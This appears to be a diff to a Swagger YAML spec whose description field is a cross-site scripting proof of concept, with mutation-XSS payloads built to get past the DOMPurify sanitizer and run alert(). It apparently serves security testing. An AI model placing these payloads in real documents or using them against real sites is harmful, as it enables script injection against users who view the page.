@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <img src=x onerror=alert(document.domain)><math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(sz7sfqdo)'>">
+    <?xml-stylesheet > <img src=x onerror="alert('DOMPurify bypassed!!!')"> ?><img src=x onerror=alert(document.domain)><math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(sz7sfqdo)'>">
 paths:
   /accounts:
     get:
